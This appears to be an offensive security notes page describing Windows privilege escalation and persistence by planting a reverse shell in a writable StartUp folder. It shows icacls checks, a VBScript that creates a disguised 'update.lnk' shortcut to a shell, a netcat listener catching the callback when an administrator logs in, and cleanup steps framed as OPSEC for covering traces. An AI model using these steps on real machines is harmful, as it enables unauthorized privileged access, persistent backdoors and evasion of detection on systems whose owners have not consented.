# Manual

One of the privilege escalation technique and so far the easiest ones to exploit it is Startup programs in the `StartUp` folder. Some versions of Windows operating systems vary to one another and it could be server or a workstation do a bit of research to find those locations and this technique is part of persistence mechanism to maintain access.

- **Windows Server 2019**

`C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp`

- **Windows 11**

`C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`

## 01 - Detect

```
C:\> icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp BUILTIN\Users:(OI)(CI)(F)
                                                             WIN-QBA94KB3IOF\Administrator:(I)(OI)(CI)(DE,DC)
                                                             WIN-QBA94KB3IOF\admin:(I)(OI)(CI)(DE,DC)
                                                             NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
                                                             BUILTIN\Administrators:(I)(OI)(CI)(F)
                                                             BUILTIN\Users:(I)(OI)(CI)(RX)
                                                             Everyone:(I)(OI)(CI)(RX)
```

## 02 - Exploit

We can copy the reverse shell to the `StartUp` folder or we can create a shortcut link file to redirect the path of our reverse shell.

```vbscript
Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\update.lnk"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "<path_to_shell>"
oLink.Save
```

Then execute it then start a shell listener

```
C:\> cscript CreateShortcut.vbs
Microsoft (R) Windows Script Host Version 5.812

```

`$ sudo nc -lvnp 53`

Now we wait for the administrator user to login and wait for a callback connection.

```
$ xfreerdp /u:<username> /p:<password> /cert:ignore /v:<IP>

$ rdesktop -u <username> -p <password> <IP>

$ sudo nc -lvnp 53

```

## 03 - Cleanup

Now the problem is through this netcat handler we can't revert back to it's original binary file. However, once you perform this technique use metasploit framework as a shell handler since it is easily can be migrated to another process and to revert back just like I've previously demonstrated when covering your traces. Take this OPSEC measure into account.

```
C:\Windows\system32> del "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\update.lnk"

C:\Windows\system32> del /path/to/shell.exe
```
